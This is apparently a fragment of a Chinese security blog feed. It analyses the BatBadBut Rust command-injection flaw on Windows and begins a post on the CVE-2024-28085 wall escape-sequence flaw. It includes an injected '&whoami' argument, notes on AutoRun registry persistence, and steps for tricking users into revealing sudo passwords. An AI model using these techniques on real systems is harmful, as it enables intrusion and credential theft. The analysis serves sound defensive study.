<span class="comment">// Start the child process. </span></span><br><span class="line">    <span class="keyword">if</span> (!CreateProcess(<span class="string">L"D:\\test.bat"</span>, <span class="comment">// Application name</span></span><br><span class="line">        <span class="literal">NULL</span>,           <span class="comment">// Command line</span></span><br><span class="line">        <span class="literal">NULL</span>,           <span class="comment">// Process handle not inheritable</span></span><br><span class="line">        <span class="literal">NULL</span>,           <span class="comment">// Thread handle not inheritable</span></span><br><span class="line">        FALSE,          <span class="comment">// Set handle inheritance to FALSE</span></span><br><span class="line">        <span class="number">0</span>,              <span class="comment">// No creation flags</span></span><br><span class="line">        <span class="literal">NULL</span>,           <span class="comment">// Use parent's environment block</span></span><br><span class="line">        <span class="literal">NULL</span>,           <span class="comment">// Use parent's starting directory </span></span><br><span class="line">        &amp;si,            <span class="comment">// Pointer to STARTUPINFO structure</span></span><br><span class="line">        &amp;pi)            <span class="comment">// Pointer to PROCESS_INFORMATION structure</span></span><br><span class="line">        )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"CreateProcess failed (%d).\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait until child process exits.</span></span><br><span class="line">    WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close process and thread handles. </span></span><br><span class="line">    CloseHandle(pi.hProcess);</span><br><span class="line">    CloseHandle(pi.hThread);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œåå¯åŠ¨çš„å­è¿›ç¨‹çš„å‘½ä»¤è¡Œå‚æ•°ä¸ºï¼š<code>C:\WINDOWS\system32\cmd.exe /c &quot;D:\test.bat&quot;</code>ã€‚</p><p>è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåœ¨ Python ä¸­é€šè¿‡ <code>subprocess</code> è¿è¡Œ <code>.bat</code> è„šæœ¬æ—¶ä¼šè‡ªåŠ¨è¿è¡Œ <code>cmd.exe</code> çš„åŸå› ï¼Œè€Œ Rust å¯èƒ½ä¹Ÿæ˜¯å‡ºäºå®‰å…¨ä¸Šçš„è€ƒè™‘ï¼Œä¸»åŠ¨å±è”½äº† <code>CreateProcess</code> çš„è¿™ä¸€ Undocumented ç‰¹æ€§ã€‚äº‹å®ä¸Šï¼ŒRust çš„è¡¥ä¸ä»£ç é¢å¤–å¼•å…¥äº†ä¸€äº› <code>cmd.exe</code> çš„å¼€å…³ï¼Œå¯æ§æ€§ä¼šæ›´å¥½ã€‚</p><h2 id="0x06-CMD-exe-å‘½ä»¤è¡Œå‚æ•°"><a href="#0x06-CMD-exe-å‘½ä»¤è¡Œå‚æ•°" class="headerlink" title="0x06. CMD.exe å‘½ä»¤è¡Œå‚æ•°"></a>0x06. CMD.exe å‘½ä»¤è¡Œå‚æ•°</h2><p>åœ¨ Unix ç³»ç»Ÿä¸­ï¼Œå¯åŠ¨å­è¿›ç¨‹æ—¶å¯ä»¥é€šè¿‡æ•°ç»„çš„æ–¹å¼æŒ‡å®š <code>argv</code> å’Œ <code>envp</code>ï¼ˆæ¯”å¦‚è°ƒç”¨ <code>execve</code>ï¼‰ã€‚ä½†æ˜¯åœ¨ Windows ä¸‹ï¼Œ<code>CreateProcess</code> åªèƒ½é€šè¿‡å•ä¸€å­—ç¬¦ä¸²çš„å½¢å¼æ¥æ¥æ”¶å‘½ä»¤è¡Œå‚æ•°ï¼Œè¿™å°±ç»™å‘½ä»¤è¡Œå‚æ•°çš„è§£æå¸¦æ¥äº†æŒ‘æˆ˜ã€‚å¥½åœ¨ Windows è¿˜æä¾›äº† <code>CommandLineToArgv</code> è¿™ä¸ª API æ¥å®ç°å‘½ä»¤è¡Œå‚æ•°çš„è§£æï¼Œè¿™å¯ä»¥ä¿æŒä¸€å®šçš„æ ‡å‡†æ€§ï¼Œä½†æ˜¯åƒ <code>cmd.exe</code> è¿™æ ·çš„ç¨‹åºä¼šæœ‰è‡ªå·±çš„å‘½ä»¤è¡Œå‚æ•°è§£æé€»è¾‘ï¼Œè¿™ä¹Ÿæ˜¯å‰é¢å‡ºç°æ³¨å…¥æ¼æ´çš„åŸå› ã€‚</p><p>æ–‡ç«  <a href="https://learn.microsoft.com/en-us/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way" target="_blank" rel="noopener">Everyone quotes command line arguments the wrong way</a> æåˆ°ï¼š</p><blockquote><p>All of cmdâ€™s transformations are triggered by the presence of one of the <em>metacharacters</em> <code>(, ), %, !, ^, &quot;, &lt;, &gt;, &amp;,</code> and <code>|</code>. <code>&quot;</code> is particularly interesting: when cmd is transforming a command line and sees a <code>&quot;</code>, it copies a <code>&quot;</code> to the new command line, then begins copying characters from the old command line to the new one without seeing whether any of these characters is a metacharacter. This copying continues until cmd either reaches the end of the command line, runs into a variable substitution, or sees another <code>&quot;</code>. In the last case, cmd copies a <code>&quot;</code> to the new command line and resumes normal processing. This behavior is <em>almost</em>, but not <em>quite</em> like what CommandLineFromArgvW does with the same character; the difference is that cmd does not know about the <code>\&quot;</code> sequence and begins interpreting metacharacters earlier than we would expect.</p></blockquote><p>è¿™æ®µè¯çœ‹èµ·æ¥å¾ˆå¥½ç†è§£ï¼Œä½†æ˜¯å¹¶ä¸èƒ½è§£é‡Šä¸‹é¢çš„ç°è±¡ï¼ˆ<code>child</code> æ‰§è¡Œåæ‰“å°è‡ªèº«çš„å‘½ä»¤è¡Œå‚æ•°ï¼‰ï¼š</p><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">child</span> "<span class="title">hello</span> <span class="title">world</span>" &gt;\\.\<span class="title">nul</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">child</span> "<span class="title">hello</span>"<span class="title">world</span>" &gt;\\.\<span class="title">nul</span></span></span><br><span class="line"><span class="function">0: [<span class="title">child</span>]</span></span><br><span class="line"><span class="function">1: [<span class="title">helloworld</span> &gt;\\.\<span class="title">nul</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">child</span> "<span class="title">hello</span>\"<span class="title">world</span>" &gt;\\.\<span class="title">nul</span></span></span><br><span class="line"><span class="function">0: [<span class="title">child</span>]</span></span><br><span class="line"><span class="function">1: [<span class="title">hello</span>"<span class="title">world</span>]</span></span><br><span class="line"><span class="function">2: [&gt;\\.\<span class="title">nul</span>]</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿä¸èƒ½è§£é‡Šå‡ºç°å‘½ä»¤æ³¨å…¥æ¼æ´é—®é¢˜çš„æœ¬è´¨ï¼š</p><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">child</span> "<span class="title">malicious</span> <span class="title">argument</span>\" &amp;<span class="title">whoami</span>"</span></span><br><span class="line"><span class="function">0: [<span class="title">child</span>]</span></span><br><span class="line"><span class="function">1: [<span class="title">malicious</span>-<span class="title">argument</span>"]</span></span><br><span class="line"><span class="function"><span class="title">ntdev</span>\<span class="title">dancol</span></span></span><br></pre></td></tr></table></figure><p>ä¸çŸ¥é“æ˜¯ä½œè€…è‡ªå·±ä¹Ÿæ²¡æœ‰å¼„æ¸…æ¥šï¼Œè¿˜æ˜¯æ•…æ„ç•™äº†ä¸€æ‰‹ :D è‡³äºçœŸå®çš„è§£æé€»è¾‘ï¼Œå¾—çœ‹ <code>cmd.exe</code> çš„æºç æ‰çŸ¥é“äº†ã€‚</p><h2 id="0x07-CMD-exe-AutoRun"><a href="#0x07-CMD-exe-AutoRun" class="headerlink" title="0x07. CMD.exe AutoRun"></a>0x07. CMD.exe AutoRun</h2><p>å‰é¢åˆ†æ Rust çš„ <code>make_bat_command_line</code> å‡½æ•°ï¼Œå‘ç°è¿è¡Œ <code>.bat</code> æˆ–è€… <code>.cmd</code> æ–‡ä»¶æ˜¯é€šè¿‡ <code>cmd.exe /d /c filepah</code> çš„å½¢å¼æ¥æ‰§è¡Œçš„ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">D:\&gt;cmd /?</span><br><span class="line">å¯åŠ¨ Windows å‘½ä»¤è§£é‡Šå™¨çš„ä¸€ä¸ªæ–°å®ä¾‹</span><br><span class="line"></span><br><span class="line">CMD [/A | /U] [/Q] [/D] [/E:ON | /E:OFF] [/F:ON | /F:OFF] [/V:ON | /V:OFF]</span><br><span class="line">    [[/S] [/C | /K] string]</span><br><span class="line"></span><br><span class="line">/C      æ‰§è¡Œå­—ç¬¦ä¸²æŒ‡å®šçš„å‘½ä»¤ç„¶åç»ˆæ­¢</span><br><span class="line">/D      ç¦æ­¢ä»æ³¨å†Œè¡¨æ‰§è¡Œ AutoRun å‘½ä»¤(è§ä¸‹)</span><br><span class="line"></span><br><span class="line">å¦‚æœ /D æœªåœ¨å‘½ä»¤è¡Œä¸Šè¢«æŒ‡å®šï¼Œå½“ CMD.EXE å¼€å§‹æ—¶ï¼Œå®ƒä¼šå¯»æ‰¾</span><br><span class="line">ä»¥ä¸‹ REG_SZ/REG_EXPAND_SZ æ³¨å†Œè¡¨å˜é‡ã€‚å¦‚æœå…¶ä¸­ä¸€ä¸ªæˆ–</span><br><span class="line">ä¸¤ä¸ªéƒ½å­˜åœ¨ï¼Œè¿™ä¸¤ä¸ªå˜é‡ä¼šå…ˆè¢«æ‰§è¡Œã€‚</span><br><span class="line"></span><br><span class="line">    HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\AutoRun</span><br><span class="line">        å’Œ/æˆ–</span><br><span class="line">    HKEY_CURRENT_USER\Software\Microsoft\Command Processor\AutoRun</span><br></pre></td></tr></table></figure><p>çœ‹ä¸Šå»ä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªæ¶æ„è½¯ä»¶å®ç°æŒä¹…åŒ–é©»ç•™çš„æ–¹å¼ï¼Œå› ä¸ºå¯åŠ¨ <code>cmd.exe</code> çš„æ—¶å€™ä¸€èˆ¬ä¸ä¼šæœ‰äººåˆ»æ„æŒ‡å®š <code>/d</code> å‚æ•°ã€‚Google æœç´¢äº†ä¸€ä¸‹ï¼Œåœ¨ <a href="https://persistence-info.github.io/Data/cmdautorun.html" target="_blank" rel="noopener">persistence-info.github.io</a> ä¸Šæœ‰æåŠï¼ˆè¿™æ˜¯ä¸€ä¸ªä¸“é—¨æ”¶é›† Windows ä¸ŠæŒä¹…åŒ–é©»ç•™æ–¹å¼çš„ç½‘ç«™ï¼Œç±»ä¼¼ <a href="https://programlife.net/2024/03/03/living-off-the-land-techniques/">Living Off the Land Techniques</a> æ”¶é›†ç½‘ç«™ï¼‰ã€‚</p><h2 id="0x08-åˆ†æå°ç»“"><a href="#0x08-åˆ†æå°ç»“" class="headerlink" title="0x08. åˆ†æå°ç»“"></a>0x08. åˆ†æå°ç»“</h2><p>åœ¨ Windows ä¸‹ï¼ŒRust åœ¨æ‰§è¡Œ <code>.bat</code> æˆ–è€… <code>.cmd</code> æ–‡ä»¶æ—¶ï¼Œåº•å±‚ä¼šè°ƒç”¨ <code>CreateProcess</code> åˆ›å»º <code>cmd.exe</code> å­è¿›ç¨‹ï¼ŒRust åœ¨æ‹¼æ¥å­è¿›ç¨‹çš„å‘½ä»¤è¡Œå‚æ•°æ—¶ä¼šæ ¹æ®éœ€è¦å¯¹å‚æ•°è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼›ä½†æ˜¯ <code>cmd.exe</code> æœ‰è‡ªå·±çš„å‘½ä»¤è¡Œå‚æ•°å¤„ç†é€»è¾‘ï¼Œè€Œ Rust å¯¹å‘½ä»¤è¡Œå‚æ•°è¿›è¡Œè½¬ä¹‰çš„é€»è¾‘å’Œ <code>cmd.exe</code> ä¸ä¸€è‡´ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ <code>cmd.exe</code> æ‰§è¡Œæ³¨å…¥çš„å‘½ä»¤ã€‚</p><p>è¿™ä¸ªæ¼æ´å¾ˆéš¾è¯´æ˜¯ç¼–ç¨‹è¯­è¨€è‡ªèº«çš„é—®é¢˜ï¼Œä½†æ˜¯åœ¨ç¼–ç¨‹è¯­è¨€ä¾§å¯ä»¥å¢åŠ å¯¹åº”çš„æ¼æ´ç¼“è§£æªæ–½ï¼Œæ‰€ä»¥ä¹Ÿä¸æ˜¯æ‰€æœ‰è¯­è¨€éƒ½ä¼šæŠŠè¿™ä¸ªå½“æˆæ¼æ´æ¥å¿«é€Ÿä¿®å¤å¤„ç†ã€‚</p><h2 id="0x09-å‚è€ƒæ–‡æ¡£"><a href="#0x09-å‚è€ƒæ–‡æ¡£" class="headerlink" title="0x09. å‚è€ƒæ–‡æ¡£"></a>0x09. å‚è€ƒæ–‡æ¡£</h2><ol><li><a href="https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/" target="_blank" rel="noopener">https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/</a></li><li><a href="https://blog.rust-lang.org/2024/04/09/cve-2024-24576.html" target="_blank" rel="noopener">https://blog.rust-lang.org/2024/04/09/cve-2024-24576.html</a></li><li><a href="https://www.kb.cert.org/vuls/id/123335" target="_blank" rel="noopener">https://www.kb.cert.org/vuls/id/123335</a></li><li><a href="https://github.com/frostb1ten/CVE-2024-24576-PoC/tree/main" target="_blank" rel="noopener">https://github.com/frostb1ten/CVE-2024-24576-PoC/tree/main</a></li><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw" target="_blank" rel="noopener">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw</a></li><li><a href="https://learn.microsoft.com/en-us/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way" target="_blank" rel="noopener">https://learn.microsoft.com/en-us/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way</a></li><li><a href="https://persistence-info.github.io/Data/cmdautorun.html" target="_blank" rel="noopener">https://persistence-info.github.io/Data/cmdautorun.html</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è¿‘æœŸæ¥è‡ª Flatt Security Inc. çš„ RyotaK æŠ«éœ²äº† Windows ä¸‹å¤šä¸ªç¼–ç¨‹è¯­è¨€çš„å‘½ä»¤æ³¨å…¥æ¼æ´ï¼ˆæ¼æ´è¢«å‘½åä¸º &lt;strong&gt;BatBadBut&lt;/strong&gt;ï¼‰ï¼Œå…¶ä¸­ Rust è¯­è¨€å¯¹åº”çš„æ¼æ´ç¼–å·ä¸º CVE-2024-24576ï¼Œå› ä¸º Rust è¯­è¨€è‡ªå¸¦æµé‡å±æ€§ï¼Œå›½å†…å®‰å…¨/ç§‘æŠ€è‡ªåª’ä½“å¯èƒ½ä¼šä½¿ç”¨ä¸€äº›æ€ªå¼‚çš„æ ‡é¢˜æ¥è¿›è¡Œå®£ä¼ ã€‚å®é™…ä¸Šï¼Œè¿™ä¸ªæ¼æ´è·Ÿå†…å­˜å®‰å…¨æ²¡æœ‰å…³ç³»ï¼Œæ˜¯ Windows ä¸‹ &lt;code&gt;cmd.exe&lt;/code&gt; å¯¹å‘½ä»¤è¡Œå‚æ•°çš„ç‰¹æ®Šè§£æé€»è¾‘æ‰€å¯¼è‡´çš„é€»è¾‘æ¼æ´ï¼›æ­¤å¤–ï¼Œè¿™ä¸ªæ¼æ´ä¹Ÿä¸ä»…ä»…å½±å“ Rustï¼Œåƒ PHPã€Python ç­‰è¯­è¨€å‡å—å½±å“ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="https://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="Rust" scheme="https://programlife.net/tags/Rust/"/>
    
      <category term="Command Injection" scheme="https://programlife.net/tags/Command-Injection/"/>
    
      <category term="cmd.exe" scheme="https://programlife.net/tags/cmd-exe/"/>
    
      <category term="CreateProcess" scheme="https://programlife.net/tags/CreateProcess/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2024-28085 Improper Neutralization of Escape Sequences in Wall</title>
    <link href="https://programlife.net/2024/03/31/cve-2024-28085-improper-neutralization-of-escape-sequences-in-wall/"/>
    <id>https://programlife.net/2024/03/31/cve-2024-28085-improper-neutralization-of-escape-sequences-in-wall/</id>
    <published>2024-03-31T13:33:37.000Z</published>
    <updated>2024-03-31T14:46:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>CVE-2024-28085 Improper Neutralization of Escape Sequences in Wall</p><a id="more"></a><h2 id="0x01-æ¼æ´ä»‹ç»"><a href="#0x01-æ¼æ´ä»‹ç»" class="headerlink" title="0x01. æ¼æ´ä»‹ç»"></a>0x01. æ¼æ´ä»‹ç»</h2><p>CVE-2024-28085 æ˜¯ Linux ä¸‹ <code>wall</code> å‘½ä»¤ä¸å½“å¤„ç† Escape Sequence å¼•å‘çš„ä¸€ä¸ªæ¼æ´ï¼Œåˆ©ç”¨è¯¥æ¼æ´å¯èƒ½å¯ä»¥çªƒå–ç®¡ç†å‘˜çš„å¯†ç ã€‚å±å®³ç®—ä¸ä¸Šå¤§ï¼Œä½†æ˜¯ Escape Sequence å¤„ç†ä¸å½“ä¹Ÿç®—æ˜¯ä¸€ç§æ¼æ´æ¨¡å¼ï¼Œå¯ä»¥å‚è€ƒ <a href="https://cwe.mitre.org/data/definitions/150.html" target="_blank" rel="noopener">CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences</a>ï¼ŒBlack Hat USA 2023 è¿˜æœ‰ä¸€ä¸ªç›¸å…³çš„è®®é¢˜ <a href="https://www.blackhat.com/us-23/briefings/schedule/#weaponizing-plain-text-ansi-escape-sequences-as-a-forensic-nightmare-31757" target="_blank" rel="noopener">Weaponizing Plain Text: ANSI Escape Sequences as a Forensic Nightmare</a>ã€‚</p><p>æŒ‰ç…§åŸä½œè€…çš„è¯´æ³•ï¼Œè¿™ä¸ªæ¼æ´å·²ç»å­˜åœ¨ç›¸å½“é•¿çš„æ—¶é—´äº†ï¼Œä½†ç¬”è€…åœ¨ Ubuntu 20.04 ä¸Šæ— æ³•å¤ç°ï¼Œåœ¨ Ubuntu 22.04 ä¸Šå¯ä»¥å¤ç°ã€‚å¦å¤–ï¼ŒUbuntu è‡ªå¸¦çš„ GNOME Terminal ä¸å—è¯¥æ¼æ´å½±å“ï¼Œå› ä¸º GNOME Terminal ä¸æ¥æ”¶ <code>wall</code> å‘é€çš„æ¶ˆæ¯ã€‚</p><h2 id="0x02-æ¼æ´åˆ†æ"><a href="#0x02-æ¼æ´åˆ†æ" class="headerlink" title="0x02. æ¼æ´åˆ†æ"></a>0x02. æ¼æ´åˆ†æ</h2><h3 id="2-1-wall"><a href="#2-1-wall" class="headerlink" title="2.1 wall"></a>2.1 wall</h3><p><code>wall</code> æ˜¯ Linux ä¸‹çš„ä¸€ä¸ªå†…ç½®ç¨‹åºï¼Œå¯ä»¥é€šè¿‡å¹¿æ’­çš„æ–¹å¼ç»™æ‰€æœ‰ç”¨æˆ·å‘é€æ¶ˆæ¯ã€‚åœ¨ Ubuntu ä¸‹ï¼Œè¿™æ˜¯ä¸€ä¸ª SGID-tty ç¨‹åºï¼Œæ™®é€šç”¨æˆ·ä¹Ÿå¯ä»¥ç›´æ¥è¿è¡Œã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> ls -al $(which wall)</span><br><span class="line">-rwxr-sr-x 1 root tty 22904  2æœˆ 21  2022 /usr/bin/wall</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span> man wall</span><br><span class="line">NAME</span><br><span class="line">       wall - write a message to all users</span><br><span class="line">SYNOPSIS</span><br><span class="line">       wall [-n] [-t timeout] [-g group] [message | file]</span><br></pre></td></tr></table></figure><h3 id="2-2-command-not-found"><a href="#2-2-command-not-found" class="headerlink" title="2.2 command-not-found"></a>2.2 command-not-found</h3><p>åœ¨ Ubuntu ä¸‹é¢ï¼Œè¿è¡Œä¸€ä¸ªä¸å­˜åœ¨çš„å‘½ä»¤ï¼Œä¼šæœ‰å¦‚ä¸‹æç¤ºï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> xxx</span><br><span class="line">Command 'xxx' not found, did you mean:</span><br><span class="line">  command 'xx' from deb fex-utils (20160919-2)</span><br><span class="line">  command 'x2x' from deb x2x (1.30-10)</span><br><span class="line">  command 'xdx' from deb xdx (2.5.0-4)</span><br><span class="line">  command 'xxd' from deb xxd (2:8.2.3995-1ubuntu2.13)</span><br><span class="line">Try: sudo apt install &lt;deb name&gt;</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šï¼Œè¿™æ˜¯ <code>/usr/lib/command-not-found</code> è¾“å‡ºçš„æç¤ºä¿¡æ¯ï¼Œè¯¥æ–‡ä»¶æ˜¯ä¸€ä¸ª Python è„šæœ¬ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> file /usr/lib/command-not-found</span><br><span class="line">/usr/lib/command-not-found: Python script, ASCII text executable</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span> /usr/lib/command-not-found xxx</span><br><span class="line">Command 'xxx' not found, did you mean:</span><br><span class="line">  command 'xxd' from deb xxd (2:8.2.3995-1ubuntu2.13)</span><br><span class="line">  command 'xdx' from deb xdx (2.5.0-4)</span><br><span class="line">  command 'x2x' from deb x2x (1.30-10)</span><br><span class="line">  command 'xx' from deb fex-utils (20160919-2)</span><br><span class="line">Try: sudo apt install &lt;deb name&gt;</span><br></pre></td></tr></table></figure><h3 id="2-3-Escape-Sequence"><a href="#2-3-Escape-Sequence" class="headerlink" title="2.3 Escape Sequence"></a>2.3 Escape Sequence</h3><p>åœ¨ Terminal ä¸­ï¼Œ<a href="https://programlife.net/tags/Escape-Sequence/">Escape Sequence</a> å¯ä»¥ç”¨æ¥äº§ç”Ÿä¸€äº›ç‰¹å®šçš„è¡Œä¸ºï¼Œæœ€å¸¸è§çš„æ˜¯æ§åˆ¶æ–‡å­—çš„å­—ä½“é¢œè‰²ã€èƒŒæ™¯é¢œè‰²ã€ç²—ä½“ã€æ–œä½“ã€ä¸‹åˆ’çº¿ç­‰ã€‚</p><p>Escape Sequence çš„æ ¼å¼ä¸º <code>&lt;Esc&gt;[</code> <code>FormatCode</code> <code>m</code>ï¼Œå…¶ä¸­ï¼š</p><ul><li><code>&lt;Esc&gt;</code> å¯ä»¥å†™æˆå¦‚ä¸‹ä¸‰ç§æ ¼å¼ï¼š<code>\e</code>ã€<code>\033</code>ã€<code>\x1b</code></li><li><code>[</code> æ˜¯å›ºå®šçš„å­—ç¬¦</li><li><code>FormatCode</code> æ˜¯ ASCII ç ï¼Œå¦‚æœæœ‰å¤šä¸ªæ§åˆ¶ç ï¼Œéœ€è¦ä½¿ç”¨ <code>;</code> åˆ†éš”</li><li><code>m</code> æ˜¯å›ºå®šçš„å­—ç¬¦</li></ul><p>æ¯”å¦‚ï¼š</p><ul><li><code>printf &quot;\033[1;4;31mHello World\n\033[0m&quot;</code> æ§åˆ¶çš„å­—ä½“æ ¼å¼ä¸ºï¼š<code>1</code> ç²—ä½“ã€<code>4</code> ä¸‹åˆ’çº¿ã€<code>31</code> çº¢è‰²</li><li><code>printf &quot;\033[4;31mHello World\n\033[0m&quot;</code> æ§åˆ¶çš„å­—ä½“æ ¼å¼ä¸ºï¼š<code>4</code> ä¸‹åˆ’çº¿ã€<code>31</code> çº¢è‰²</li><li>æ³¨æ„ <code>0</code> è¡¨ç¤ºé‡ç½®æ ¼å¼</li></ul><p><img src="/uploads/202403/terminal-escape-sequence.png" alt="Terminal Escape Sequence"></p><h3 id="2-4-æ¼æ´åˆ†æ"><a href="#2-4-æ¼æ´åˆ†æ" class="headerlink" title="2.4 æ¼æ´åˆ†æ"></a>2.4 æ¼æ´åˆ†æ</h3><p><code>wall</code> å¯ä»¥ä»å‘½ä»¤è¡Œæ¥æ”¶è¦å‘é€çš„æ¶ˆæ¯ï¼Œä¹Ÿå¯ä»¥ä» <code>stdin</code> æˆ–è€…æ–‡ä»¶æ¥æ”¶è¦å‘é€çš„æ¶ˆæ¯ã€‚å…¶ä¸­å‘½ä»¤è¡Œä¼ é€’çš„æ¶ˆæ¯æœªç»è¿‡ä»»ä½•å¤„ç†ï¼Œä»£ç å‚è€ƒ <a href="https://github.com/util-linux/util-linux/blob/07f0f0f5bd1e5e2268257ae1ff6d76a9b6c6ea8b/term-utils/wall.c#L365" target="_blank" rel="noopener">term-utils/wall.c#L365</a>ï¼ˆä» <code>master</code> åˆ†æ”¯çš„ä»£ç çœ‹ï¼Œè¿™ä¸ªæ¼æ´ç›®å‰æš‚æ—¶æ²¡æœ‰ä¿®å¤ï¼‰ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Read message from argv[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; mvecsz; i++) &#123;</span><br><span class="line">    <span class="built_in">fputs</span>(mvec[i], fs);</span><br><span class="line">    <span class="keyword">if</span> (i &lt; mvecsz - <span class="number">1</span>)</span><br><span class="line">        fputc(<span class="string">' '</span>, fs);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">fputs</span>(<span class="string">"\r\n"</span>, fs);</span><br></pre></td></tr></table></figure><p>è€Œ <code>stdin</code> ä¼ é€’çš„æ¶ˆæ¯æ˜¯ä¼šç‰¹æ®Šå¤„ç†çš„ï¼ˆå¦‚æœæ˜¯æ–‡ä»¶ï¼Œä½¿ç”¨ <code>freopen</code> å°† <code>stdin</code> ç»‘å®šåˆ°æ–‡ä»¶ï¼‰ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * read message from &lt;file&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (fname) &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * When we are not root, but suid or sgid, refuse to read files</span></span><br><span class="line"><span class="comment">     * (e.g. device files) that the user may not have access to.</span></span><br><span class="line"><span class="comment">     * After all, our invoker can easily do "wall &lt; file"</span></span><br><span class="line"><span class="comment">     * instead of "wall file".</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">uid_t</span> uid = getuid();</span><br><span class="line">    <span class="keyword">if</span> (uid &amp;&amp; (uid != geteuid() || getgid() != getegid()))</span><br><span class="line">        errx(EXIT_FAILURE, _(<span class="string">"will not read %s - use stdin."</span>),</span><br><span class="line">             fname);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!freopen(fname, <span class="string">"r"</span>, <span class="built_in">stdin</span>))</span><br><span class="line">        err(EXIT_FAILURE, _(<span class="string">"cannot open %s"</span>), fname);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Read message from stdin.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">while</span> (getline(&amp;lbuf, &amp;lbuflen, <span class="built_in">stdin</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">    fputs_careful(lbuf, fs, <span class="string">'^'</span>, <span class="literal">true</span>, TERM_WIDTH);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨äº† <code>fputs_careful</code>ï¼Œæºç å¯ä»¥å‚è€ƒ <a href="https://github.com/util-linux/util-linux/blob/07f0f0f5bd1e5e2268257ae1ff6d76a9b6c6ea8b/include/carefulputc.h#L22" target="_blank" rel="noopener">include/carefulputc.h#L22</a>ã€‚</p><h2 id="0x03-æ¼æ´åˆ©ç”¨"><a href="#0x03-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x03. æ¼æ´åˆ©ç”¨"></a>0x03. æ¼æ´åˆ©ç”¨</h2><p>åŸä½œè€…æå‡ºçš„æ¼æ´åˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p><ol><li>ç”¨æˆ·é€šè¿‡ <code>sudo</code> æ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼Œæ¯”å¦‚ <code>sudo systemctl start apache2</code>ï¼Œç”¨æˆ·è¾“å…¥ç®¡ç†å‘˜å¯†ç å¹¶å›è½¦</li><li>æ”»å‡»è€…å¯ä»¥å…ˆåç›‘æ§åˆ° <code>sudo systemctl start apache2</code> å’Œ <code>systemctl start apache2</code> ä¸¤æ¡å‘½ä»¤çš„æ‰§è¡Œ</li><li>æ”»å‡»è€…é€šè¿‡ <code>wall</code> å¹¿æ’­ä¸€æ¡ç²¾å¿ƒæ„é€ çš„æ¶ˆæ¯ï¼Œä½¿å¾—å¦ä¸€ç«¯çš„ç”¨æˆ·ä»¥ä¸ºå¯†ç è¾“å…¥é”™è¯¯</li><li>ç”¨æˆ·é‡æ–°è¾“å…¥å¯†ç å¹¶å›è½¦</li><li>æ­¤æ—¶å¯†ç ä¼šè¢«å½“ä½œä¸€æ¡å‘½ä»¤ï¼Œæ˜¾ç„¶è¯¥å‘½ä»¤å¹¶ä¸å­˜åœ¨</li><li>æ”»å‡»è€…é€šè¿‡ç›‘æ§ <code>/usr/lib/command-not-found</code> 